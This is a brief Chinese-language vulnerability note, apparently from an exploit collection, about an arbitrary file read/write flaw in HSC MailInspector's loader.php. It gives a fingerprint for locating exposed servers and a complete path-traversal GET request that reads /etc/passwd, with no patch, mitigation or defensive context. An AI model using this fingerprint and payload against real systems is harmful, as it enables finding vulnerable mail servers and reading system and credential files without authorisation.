# HSCMailinspectorloader.php任意文件读取漏洞

HSCMailinspectorloader ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="mailinspector/public"`
- **请求**：`GET /mailinspector/public/loader.php?path=../../../../../../../etc/passwd HTTP/1.1`